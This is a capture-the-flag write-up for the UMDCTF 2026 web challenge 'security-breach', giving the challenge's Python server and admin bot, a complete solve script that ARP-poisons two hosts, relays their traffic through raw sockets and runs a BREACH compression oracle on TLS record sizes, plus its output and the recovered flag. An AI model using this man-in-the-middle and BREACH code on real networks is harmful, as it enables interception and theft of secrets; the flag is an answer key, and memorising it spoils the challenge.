---
layout: post
title:  "security-breach"
date:   2026-04-28 14:19:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /UMDCTF-2026-security-breach/
---
{% raw %}
**Category**: Web

**Author**: tahmid-23

**Description**: Our agents have infiltrated the world's smallest--I mean largest--insider trading network! They left a note for you on the server. Best of luck! `nc challs.umdctf.io 31337`

I download the challenge files `server.py` and `admin.py`. Contents of `server.py`:
```python
import gzip
import json
import os
import re
import secrets
import ssl
import sys
import threading
import zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

try:
    import brotli  # type: ignore
    _HAS_BROTLI = True
except ImportError:
    _HAS_BROTLI = False

def _required(name: str) -> str:
    v = os.environ.get(name)
    if v is None or v == "":
        print(f"[server] FATAL: required env var {name} is unset", file=sys.stderr)
        sys.exit(1)
    return v


ADMIN_USER = _required("ADMIN_USER")
ADMIN_PASS = _required("ADMIN_PASS")
FLAG = _required("FLAG")
ADMIN_SESSION = secrets.token_hex(16)

BIND_HOST = os.environ.get("BIND_HOST", "127.0.0.1")
BIND_PORT = int(os.environ.get("BIND_PORT", "4443"))
CERT_FILE = os.environ.get("CERT_FILE", "certs/cert.pem")
KEY_FILE = os.environ.get("KEY_FILE", "certs/key.pem")

MAX_FILTER_LEN = 128
FILTER_RE = re.compile(r"^[A-Za-z0-9_{}]*$")

DASHBOARD_TEMPLATE = '{{"filter":"{filter}","flag":"{flag}"}}'

state_lock = threading.Lock()
latest_suggestion = ""


def _compress_gzip(data: bytes) -> bytes:
    return gzip.compress(data, compresslevel=6, mtime=0)


def _compress_deflate(data: bytes) -> bytes:
    return zlib.compress(data, 6)


def _compress_br(data: bytes) -> bytes:
    if not _HAS_BROTLI:
        raise RuntimeError("brotli not available")
    return brotli.compress(data, quality=6)


_ENCODERS = [
    ("gzip", _compress_gzip),
    ("br", _compress_br if _HAS_BROTLI else None),
    ("deflate", _compress_deflate),
]


def pick_encoding(accept_encoding: str):
    """Return (name, encoder) for the first server-preferred codec the client
    lists in its Accept-Encoding. Falls back to (None, None) for identity."""
    accepted = {
        p.strip().split(";", 1)[0].lower()
        for p in (accept_encoding or "").split(",")
    }
    for name, fn in _ENCODERS:
        if fn is not None and name in accepted:
            return name, fn
    return None, None


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        sys.stderr.write("[server] " + (fmt % args) + "\n")

    def _session_ok(self) -> bool:
        cookie = self.headers.get("Cookie", "")
        for part in cookie.split(";"):
            k, _, v = part.strip().partition("=")
            if k == "session" and v == ADMIN_SESSION:
                return True
        return False

    def _send(self, status, body, *, encoding=None,
              content_type="application/json", extra_headers=None):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        if encoding:
            self.send_header("Content-Encoding", encoding)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "keep-alive")
        for k, v in (extra_headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _json(self, status, obj):
        self._send(status, json.dumps(obj, separators=(",", ":")).encode())

    def do_GET(self):
        url = urlparse(self.path)

        if url.path == "/api/dashboard":
            if not self._session_ok():
                self._json(401, {"error": "login required"})
                return
            with state_lock:
                q = latest_suggestion
            body = DASHBOARD_TEMPLATE.format(filter=q, flag=FLAG).encode()
            enc_name, enc_fn = pick_encoding(self.headers.get("Accept-Encoding", ""))
            if enc_fn is not None:
                body = enc_fn(body)
            self._send(200, body, encoding=enc_name)
            return

        if url.path == "/api/suggestions/latest":
            with state_lock:
                q = latest_suggestion
            self._json(200, {"filter": q})
            return

        if url.path == "/":
            self._json(200, {
                "service": "umdmarket insider dashboard",
                "endpoints": [
                    "POST /login",
                    "POST /api/suggestions",
                    "GET  /api/suggestions/latest",
                    "GET  /api/dashboard?filter=<q>  (admin-only)",
                ],
            })
            return

        self._send(404, b'{"error":"not found"}')

    def do_POST(self):
        global latest_suggestion
        url = urlparse(self.path)
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length) if length else b""

        if url.path == "/login":
            form = parse_qs(raw.decode(errors="replace"))
            if (form.get("user", [""])[0] == ADMIN_USER
                    and form.get("pass", [""])[0] == ADMIN_PASS):
                self._send(
                    200, b'{"ok":true}',
                    extra_headers={"Set-Cookie": f"session={ADMIN_SESSION}; Path=/"},
                )
            else:
                self._json(401, {"error": "bad credentials"})
            return

        if url.path == "/api/suggestions":
            q = ""
            ct = self.headers.get("Content-Type", "")
            if ct.startswith("application/json"):
                try:
                    q = (json.loads(raw or b"{}").get("filter") or "")
                except Exception:
                    q = ""
            else:
                q = parse_qs(raw.decode(errors="replace")).get("filter", [""])[0]
            if len(q) > MAX_FILTER_LEN or not FILTER_RE.match(q):
                self._json(400, {"error": "bad filter"})
                return
            with state_lock:
                latest_suggestion = q
            self._json(200, {"ok": True})
            return

        self._send(404, b'{"error":"not found"}')


def build_ssl_context():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)
    return ctx


def main():
    srv = ThreadingHTTPServer((BIND_HOST, BIND_PORT), Handler)
    srv.socket = build_ssl_context().wrap_socket(srv.socket, server_side=True)
    print(f"[server] https://{BIND_HOST}:{BIND_PORT}", flush=True)
    srv.serve_forever()


if __name__ == "__main__":
    main()
```

Contents of `admin.py`:
```python
import http.client
import os
import ssl
import sys
import time
import urllib.parse

def _required(name: str) -> str:
    v = os.environ.get(name)
    if v is None or v == "":
        print(f"[admin] FATAL: required env var {name} is unset", file=sys.stderr)
        sys.exit(1)
    return v


SERVER_HOST = os.environ.get("SERVER_HOST", "127.0.0.1")
SERVER_PORT = int(os.environ.get("SERVER_PORT", "4443"))
ADMIN_USER = _required("ADMIN_USER")
ADMIN_PASS = _required("ADMIN_PASS")
INTERVAL = float(os.environ.get("INTERVAL", "0.05"))


def build_ssl_context() -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def login(conn: http.client.HTTPSConnection) -> str:
    body = urllib.parse.urlencode({"user": ADMIN_USER, "pass": ADMIN_PASS})
    conn.request(
        "POST", "/login", body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),
            "Connection": "keep-alive",
        },
    )
    resp = conn.getresponse()
    cookie = resp.getheader("Set-Cookie", "")
    resp.read()
    if not cookie:
        raise RuntimeError("admin login failed")
    return cookie.split(";", 1)[0]


def fetch_dashboard(conn: http.client.HTTPSConnection, cookie: str) -> None:
    conn.request(
        "GET", "/api/dashboard",
        headers={
            "Cookie": cookie,
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Connection": "keep-alive",
        },
    )
    resp = conn.getresponse()
    resp.read()


def main():
    ctx = build_ssl_context()
    while True:
        try:
            conn = http.client.HTTPSConnection(SERVER_HOST, SERVER_PORT, context=ctx)
            conn.connect()
            cookie = login(conn)
            print(f"[admin] logged in, cookie={cookie}", file=sys.stderr, flush=True)
            while True:
                fetch_dashboard(conn, cookie)
                time.sleep(INTERVAL)
        except Exception as e:
            print(f"[admin] error: {e!r}; reconnecting", file=sys.stderr, flush=True)
            time.sleep(1)


if __name__ == "__main__":
    main()
```

I connect to the server:
```shell
nc challs.umdctf.io 31337  
bash: cannot set terminal process group (-1): Inappropriate ioctl for device  
bash: no job control in this shell  
player@insider-market:~$ ls  
ls  
notes.md  
player@insider-market:~$
```

Looks like I get a shell and there is a note:
```shell
player@insider-market:~$ cat notes.md  
cat notes.md  
hey. i got this far and then had to drop it. you take it from here.  
  
## what i know  
  
we're on the internal umdmarket network. their admin is a compulsive insider trader and keeps their private watchlist open in a browser tab. their browser is literally **hammering their own dashboard endpoint on a loop** to get live updates.  
  
## the hosts  
  
- **10.0.0.1**  — the admin box. no services listening, just an outbound browser tab. i can ping it but there's nothing to poke.  
- **10.0.0.2**  — the server. it's https on :443 with a self-signed cert (needs `-k`).  
- **10.0.0.3**  — you.  
  
the admin box has no login from me; i don't have creds and didn't get around to  
trying to crack anything. the server has *some* stuff open to anyone though:  
  
POST /api/suggestions          # anyone can submit a "filter suggestion"  
GET  /api/suggestions/latest   # anyone can read the latest one  
GET  /api/dashboard?filter=X   # admin-only, 401 without the right session cookie  
POST /login                    # admin login, i don't have the password  
  
the admin is hitting `/api/dashboard` every ~50ms. their browser (probably Chrome?) is probably using some kind of compression and TLS, so there's no way i can inspect the responses. not sure where to go from here.  
  
## the flag  
did some osint, I know the flag format is `UMDCTF{[a-z0-9_]+}`.  
  
I installed some tools that might help you out...
```

This explains everything. I'm on the internal umdmarket network with their admin who is contantly hitting `/api/dashboard` every 50ms (with https). I am `10.0.0.3`, the server is `10.0.0.2`, and the admin is `10.0.0.1`:
```shell
player@insider-market:~$ curl -k https://10.0.0.2/api/suggestions/latest  
curl -k https://10.0.0.2/api/suggestions/latest  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100    13  100    13    0     0    259      0 --:--:-- --:--:-- --:--:--   260  
{"filter":""}
```

The flag is `a-z`, `0-9`, `_`, and prefixed with `UMDCTF{` ending with `}`. 

The vulnerability is in the servers response template:
```python
DASHBOARD_TEMPLATE = '{{"filter":"{filter}","flag":"{flag}"}}'
```
Both the controllable input and the flag appear in the same gzip compressed response. If the filter input shares a prefix with the flag, the compressor creates a back reference and the output will be shorter. This enables a BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext) attack [https://www.startupdefense.io/cyberattacks/breach-attack](https://www.startupdefense.io/cyberattacks/breach-attack) 

The machine does have some potentially useful tools like `tcpdump` and `socat` however `sudo` is missing:
```shell
player@insider-market:~$ sudo tcpdump  
sudo tcpdump  
bash: sudo: command not found
```

I will need to use python. Raw `AF_PACKET` sockets work without `sudo`. The container grants `CAP_NET_RAW` to the player so you can capture and inject packets:
```shell
player@insider-market:~$ capsh --print | grep cap_net_raw  
capsh --print | grep cap_net_raw  
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore  
Ambient set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore  
Current IAB: ^cap_chown,^cap_dac_override,^cap_dac_read_search,^cap_fowner,^cap_fsetid,^cap_kill,^cap_setgid,^cap_setuid,^cap_setpcap,^cap_linux_immutable,^cap_net_bind_service,^cap_net_broadcast,^cap_net_admin,^cap_net_raw,^cap_ipc_lock,^cap_ipc_owner,^cap_sys_module,^cap_sys_rawio,^cap_sys_chroot,^cap_sys_ptrace,^cap_sys_pacct,^cap_sys_admin,^cap_sys_boot,^cap_sys_nice,^cap_sys_resource,^cap_sys_time,^cap_sys_tty_config,^cap_mknod,^cap_lease,^cap_audit_write,^cap_audit_control,^cap_setfcap,^cap_mac_override,^cap_mac_admin,^cap_syslog,^cap_wake_alarm,^cap_block_suspend,^cap_audit_read,^cap_perfmon,^cap_bpf,^cap_checkpoint_restore
```

The answer is ARP poisoning plus userspace packet forwarding. Poisoning both the admin and servers ARP caches will cause traffic to route through me. BREACH exploits HTTP compression (`gzip/DEFLATE`). The attack works by injecting data which mixes with a secret in the compressed response (the flag in the dashboard response). Once I am able to sniff network traffic I can measure changes in the length of the encrypted HTTPS resonse packets. A smaller packet suggests the injected text matched part of the secret and compressed quicker.

Solve script:
```python
#!/usr/bin/env python3
import gzip, socket, struct, time, threading, subprocess, re, statistics, sys

OUR_IP    = "10.0.0.3"
ADMIN_IP  = "10.0.0.1"
SERVER_IP = "10.0.0.2"
MAX_FILTER = 128
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_}"

TEMPLATE = '{{"filter":"{filter}","flag":"{flag}"}}'
BODY_MAX = 180

# offline oracle (sanity check using a placeholder flag)
def offline_sizes(known, charset="abcdefghijklmnopqrstuvwxyz0123456789_}",
                  placeholder="UMDCTF{insider_trading_secret}"):
    # compute expected gzip sizes with repetition
    results = {}
    for c in charset:
        cand = known + c
        f = make_filter(cand)
        body = TEMPLATE.format(filter=f, flag=placeholder).encode()
        results[c] = len(gzip.compress(body, compresslevel=6, mtime=0))
    best = min(results, key=results.get)
    print(f"[offline] expected winner for known={known!r}: '{best}'  "
          f"sizes {sorted(set(results.values()))[:5]}")

# network helpers
def ip2b(s):  return socket.inet_aton(s)
def mac2b(s): return bytes.fromhex(s.replace(":", ""))
def b2mac(b): return ":".join(f"{x:02x}" for x in b)

def get_iface_mac():
    out = subprocess.check_output(["ip", "link"], text=True)
    iface = None
    for line in out.splitlines():
        m = re.search(r'\d+:\s+(vp-i-\S+?)(?:@\S+)?:', line)
        if m: iface = m.group(1)
        m2 = re.search(r'link/ether\s+((?:[\da-f]{2}:){5}[\da-f]{2})', line)
        if m2 and iface:
            return iface, mac2b(m2.group(1))
    raise RuntimeError("interface not found")

def resolve_mac(ip):
    subprocess.run(["ping", "-c", "3", "-W", "1", ip], capture_output=True)
    for _ in range(8):
        with open("/proc/net/arp") as f:
            for line in f:
                p = line.split()
                if len(p) >= 4 and p[0] == ip and p[3] not in ("00:00:00:00:00:00","HWaddress"):
                    return mac2b(p[3])
        time.sleep(0.5)
    raise RuntimeError(f"MAC for {ip} not found")

# ARP spoof
def arp_reply_frame(src_mac, src_ip, dst_mac, dst_ip):
    return (
        dst_mac + src_mac + b'\x08\x06' +
        struct.pack(">HHBBH", 1, 0x0800, 6, 4, 2) +
        src_mac + ip2b(src_ip) +
        dst_mac + ip2b(dst_ip)
    )

def run_spoofer(send_sock, our_mac, admin_mac, server_mac, stop):
    p_admin  = arp_reply_frame(our_mac, SERVER_IP, admin_mac,  ADMIN_IP)
    p_server = arp_reply_frame(our_mac, ADMIN_IP,  server_mac, SERVER_IP)
    while not stop.is_set():
        try:
            send_sock.send(p_admin)
            send_sock.send(p_server)
        except Exception: pass
        time.sleep(0.25)

# packet capture
_lock   = threading.Lock()
_buf    = []          # list of (timestamp_float, record_length_int)

def extract_tls_app_lengths(frame):
    # parse ethernet frame. Return TLS AppData record lengths for server > admin
    if len(frame) < 54: return []
    if frame[12:14] != b'\x08\x00': return []
    if frame[23] != 6: return []
    src = socket.inet_ntoa(frame[26:30])
    dst = socket.inet_ntoa(frame[30:34])
    if src != SERVER_IP or dst != ADMIN_IP: return []
    ihl      = (frame[14] & 0xf) * 4
    tcp_base = 14 + ihl
    if len(frame) < tcp_base + 20: return []
    sport = struct.unpack(">H", frame[tcp_base:tcp_base+2])[0]
    if sport != 443: return []
    doff    = (frame[tcp_base+12] >> 4) * 4
    payload  = frame[tcp_base + doff:]
    out, i = [], 0
    while i + 5 <= len(payload):
        ct  = payload[i]
        rln = struct.unpack(">H", payload[i+3:i+5])[0]
        if ct == 0x17 and 20 < rln < 5000:
            out.append(rln)
        if rln == 0: break
        i += 5 + rln
    return out

def run_forwarder(recv_sock, send_sock, our_mac, admin_mac, server_mac, stop):
    while not stop.is_set():
        try:
            frame = recv_sock.recv(65535)
        except (socket.timeout, BlockingIOError, OSError):
            continue
        if len(frame) < 34 or frame[12:14] != b'\x08\x00':
            continue
        if frame[6:12] == our_mac:    # dont relay our own frames
            continue
        src = socket.inet_ntoa(frame[26:30])
        dst = socket.inet_ntoa(frame[30:34])
        if src == ADMIN_IP and dst == SERVER_IP:
            fwd = server_mac + our_mac + frame[12:]
            try: send_sock.send(fwd)
            except Exception: pass
        elif src == SERVER_IP and dst == ADMIN_IP:
            lens = extract_tls_app_lengths(frame)
            if lens:
                now = time.time()
                with _lock:
                    for l in lens:
                        _buf.append((now, l))
            fwd = admin_mac + our_mac + frame[12:]
            try: send_sock.send(fwd)
            except Exception: pass

# oracle
def make_filter(candidate):
    # repeat candidate to fill the 128 char filter budget.
    # this will amplify the compression signal ~(128/len) times
	# because the flag is short the compression difference from a single 
	# character is tiny. By repeating the candidate to fill the 128 byte filter 
	# limit, you amplify the repetition making the size difference measurable
    if not candidate: return ""
    reps = max(1, MAX_FILTER // len(candidate))
    return (candidate * reps)[:MAX_FILTER]

def submit_filter(f):
    subprocess.run(
        ["curl","-k","-s","-X","POST",
         f"https://{SERVER_IP}/api/suggestions",
         "-H","Content-Type: application/json",
         "-d", f'{{"filter":"{f}"}}'],
        capture_output=True, timeout=5
    )

def measure(candidate, settle=0.4, window=2.0):
    """
    1. submit filter
    2. wait 'settle' seconds
    3. reset buffer
    4. collect body sized records for 'window' seconds
    Returns list of body record sizes.
    """
    f = make_filter(candidate)
    submit_filter(f)
    time.sleep(settle)          # OLD filter responses drain here
    cutoff = time.time()
    with _lock:
        _buf.clear()            # start fresh AFTER old responses gone
    time.sleep(window)          # collect with new filter active
    with _lock:
        # only body sized records
        return [s for (t, s) in _buf if t > cutoff and s < BODY_MAX]

# main
def main():
    print("Detecting interface and MAC...")
    iface, our_mac = get_iface_mac()
    print(f"iface={iface}  mac={b2mac(our_mac)}")

    print("Resolving admin and server MACs via ARP...")
    admin_mac  = resolve_mac(ADMIN_IP)
    server_mac = resolve_mac(SERVER_IP)
    print(f"admin={b2mac(admin_mac)}  server={b2mac(server_mac)}")

    try:
        with open("/proc/sys/net/ipv4/ip_forward","w") as fh: fh.write("1")
        print("ip_forward = 1 (kernel forwarding on)")
    except Exception as e:
        print(f"ip_forward: {e} (userspace relay only)")

    ETH_P_ALL = socket.htons(3)
    recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ETH_P_ALL)
    recv_sock.bind((iface, 0))
    recv_sock.settimeout(0.02)
    send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ETH_P_ALL)
    send_sock.bind((iface, 0))

    stop = threading.Event()
    threading.Thread(target=run_spoofer,
        args=(send_sock, our_mac, admin_mac, server_mac, stop), daemon=True).start()
    threading.Thread(target=run_forwarder,
        args=(recv_sock, send_sock, our_mac, admin_mac, server_mac, stop), daemon=True).start()

    print("Waiting 3s for ARP poison to propagate...")
    time.sleep(3)

    # sanity check
    baseline = measure("", settle=0.5, window=2.0)
    if not baseline:
        print("No body records seen after 2s. ARP not working?")
        stop.set(); return
    print(f"Baseline body record sizes (empty filter): {sorted(baseline)[:10]}")
    print(f"mean={statistics.mean(baseline):.1f}  n={len(baseline)}")

    known = "UMDCTF{"
    print(f"\nBREACH attack starting. Known: {known}\n")

    try:
        while True:
            scores   = {}
            all_sizes = {}

            for c in CHARSET:
                candidate = known + c
                sizes = measure(candidate, settle=0.4, window=1.5)
                s = statistics.mean(sizes) if sizes else 9999.0
                scores[c] = s
                all_sizes[c] = sizes

            # determine winner after all characters measured
            best = min(scores, key=scores.get)
            best_val = scores[best]
            sorted_chars = sorted(CHARSET, key=lambda c: scores[c])
            gap = scores[sorted_chars[1]] - best_val if len(sorted_chars) > 1 else 0

            # print all results, show winner correctly
            for c in CHARSET:
                s = scores[c]
                marker = " <<<" if c == best else ""
                print(f"  {(known+c)!r:40}  mean={s:7.2f}  n={len(all_sizes[c])}{marker}")

            print(f"\nWinner: '{best}'  score={best_val:.2f}  gap_to_2nd={gap:.2f}")

            if gap < 0.5:
                print(f"Weak signal. Top candidates: {sorted_chars[:5]}")
                print(f"Offline oracle prediction:")
                offline_sizes(known)

            known += best
            print(f"Recovered so far: {known}\n")
            sys.stdout.flush()
            if best == '}':
                break
    finally:
        stop.set()

    print(f"\n[FLAG] {known}")

if __name__ == "__main__":
    main()
```

I can't `ctrl+c` in the shell so I run the script like this:
```shell
nc challs.umdctf.io 31337  
bash: cannot set terminal process group (-1): Inappropriate ioctl for device  
bash: no job control in this shell  
player@insider-market:~$ cat > exploit.py << 'EOF'
... exploit script contents ...
EOF
player@insider-market:~$ python3 exploit.py
```

Output:
```shell
player@insider-market:~$ python3 exploit.py  
python3 exploit.py  
Detecting interface and MAC...  
iface=vp-i-3d48620b  mac=5e:be:84:44:46:e4  
Resolving admin and server MACs via ARP...  
admin=be:d7:aa:e3:1c:71  server=d6:87:95:a0:6c:02  
ip_forward = 1 (kernel forwarding on)  
Waiting 3s for ARP poison to propagate...  
Baseline body record sizes (empty filter): [88, 88, 88, 88, 88, 88, 88, 88, 88, 88]  
mean=88.0  n=35  
  
BREACH attack starting. Known: UMDCTF{  
  
'UMDCTF{a'                                mean=  92.00  n=28  
'UMDCTF{b'                                mean=  92.00  n=27  
'UMDCTF{c'                                mean=  91.00  n=25 <<<  
'UMDCTF{d'                                mean=  92.00  n=28  
'UMDCTF{e'                                mean=  92.00  n=28  
'UMDCTF{f'                                mean=  92.00  n=27  
'UMDCTF{g'                                mean=  92.00  n=27  
'UMDCTF{h'                                mean=  92.00  n=27  
'UMDCTF{i'                                mean=  92.00  n=25  
'UMDCTF{j'                                mean=  92.00  n=28  
'UMDCTF{k'                                mean=  92.00  n=29  
'UMDCTF{l'                                mean=  92.00  n=27  
'UMDCTF{m'                                mean=  92.00  n=26  
'UMDCTF{n'                                mean=  92.00  n=25  
'UMDCTF{o'                                mean=  92.00  n=26  
'UMDCTF{p'                                mean=  92.00  n=26  
'UMDCTF{q'                                mean=  92.00  n=28  
'UMDCTF{r'                                mean=  92.00  n=27  
'UMDCTF{s'                                mean=  92.00  n=27  
'UMDCTF{t'                                mean=  92.00  n=27  
'UMDCTF{u'                                mean=  92.00  n=27  
'UMDCTF{v'                                mean=  92.00  n=26  
'UMDCTF{w'                                mean=  92.00  n=26  
'UMDCTF{x'                                mean=  92.00  n=26  
'UMDCTF{y'                                mean=  92.00  n=26  
'UMDCTF{z'                                mean=  92.00  n=26  
'UMDCTF{0'                                mean=  92.00  n=27  
'UMDCTF{1'                                mean=  92.00  n=25  
'UMDCTF{2'                                mean=  92.00  n=23  
'UMDCTF{3'                                mean=  92.00  n=28  
'UMDCTF{4'                                mean=  92.00  n=28  
'UMDCTF{5'                                mean=  92.00  n=28  
'UMDCTF{6'                                mean=  92.00  n=27  
'UMDCTF{7'                                mean=  92.00  n=28  
'UMDCTF{8'                                mean=  92.00  n=29  
'UMDCTF{9'                                mean=  92.00  n=29  
'UMDCTF{_'                                mean=  92.00  n=29  
'UMDCTF{}'                                mean=  92.00  n=29  
  
  Winner: 'c'  score=91.00  gap_to_2nd=1.00  
Recovered so far: UMDCTF{c

... etc ...

  Winner: 'e'  score=91.00  gap_to_2nd=1.00  
Recovered so far: UMDCTF{cr1m3_p4ys_br34ch_m0re  
  
'UMDCTF{cr1m3_p4ys_br34ch_m0rea'          mean=  93.00  n=15  
'UMDCTF{cr1m3_p4ys_br34ch_m0reb'          mean=  93.00  n=23  
'UMDCTF{cr1m3_p4ys_br34ch_m0rec'          mean=  93.00  n=25  
'UMDCTF{cr1m3_p4ys_br34ch_m0red'          mean=  93.00  n=19  
'UMDCTF{cr1m3_p4ys_br34ch_m0ree'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0ref'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0reg'          mean=  93.00  n=26  
'UMDCTF{cr1m3_p4ys_br34ch_m0reh'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rei'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rej'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rek'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rel'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rem'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0ren'          mean=  93.00  n=26  
'UMDCTF{cr1m3_p4ys_br34ch_m0reo'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rep'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0req'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rer'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0res'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0ret'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0reu'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rev'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0rew'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0rex'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0rey'          mean=  93.00  n=26  
'UMDCTF{cr1m3_p4ys_br34ch_m0rez'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0re0'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0re1'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0re2'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0re3'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0re4'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0re5'          mean=  93.00  n=27  
'UMDCTF{cr1m3_p4ys_br34ch_m0re6'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0re7'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0re8'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0re9'          mean=  93.00  n=29  
'UMDCTF{cr1m3_p4ys_br34ch_m0re_'          mean=  93.00  n=28  
'UMDCTF{cr1m3_p4ys_br34ch_m0re}'          mean=  92.00  n=28 <<<  
  
Winner: '}'  score=92.00  gap_to_2nd=1.00  
Recovered so far: UMDCTF{cr1m3_p4ys_br34ch_m0re}  
  
  
[FLAG] UMDCTF{cr1m3_p4ys_br34ch_m0re}
```
{% endraw %}
`UMDCTF{cr1m3_p4ys_br34ch_m0re}`
